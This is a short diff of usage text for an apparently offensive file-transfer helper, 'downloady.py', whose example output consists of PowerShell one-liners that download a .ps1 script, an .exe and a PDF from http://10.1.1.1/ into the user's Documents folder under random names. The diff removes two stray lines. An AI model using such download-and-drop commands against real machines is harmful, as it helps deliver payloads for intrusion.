@@ -47,7 +47,6 @@ Usage:
 	python3 downloady.py lolw http://10.1.1.1/ ps -f files.txt
 	
 	
-s .ps1
 	Local Filename: s.ps1 -> Remote Filename: utedqs.ps1
 	Download URL: http://10.1.1.1/s.ps1 	Output to: "C:\Users\$env:USERNAME\Documents\utedqs.ps1"
 $httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.GetAsync("http://10.1.1.1/s.ps1").Result; $response.Content.ReadAsByteArrayAsync().Result | Set-Content -Path "C:\Users\$env:USERNAME\Documents\utedqs.ps1"-Encoding Byte
@@ -56,7 +55,6 @@ $httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.Get
 	Download URL: http://10.1.1.1/asdfasdfafasdf.exe 	Output to: "C:\Users\$env:USERNAME\Documents\adfffs.exe"
 $httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.GetAsync("http://10.1.1.1/asdfasdfafasdf.exe").Result; $response.Content.ReadAsByteArrayAsync().Result | Set-Content -Path "C:\Users\$env:USERNAME\Documents\adfffs.exe"-Encoding Byte
 
-1 .pdf
 	Local Filename: 1.pdf -> Remote Filename: ehyzy1.pdf
 	Download URL: http://10.1.1.1/1.pdf 	Output to: "C:\Users\$env:USERNAME\Documents\ehyzy1.pdf"
 $httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.GetAsync("http://10.1.1.1/1.pdf").Result; $response.Content.ReadAsByteArrayAsync().Result | Set-Content -Path "C:\Users\$env:USERNAME\Documents\ehyzy1.pdf"-Encoding Byte
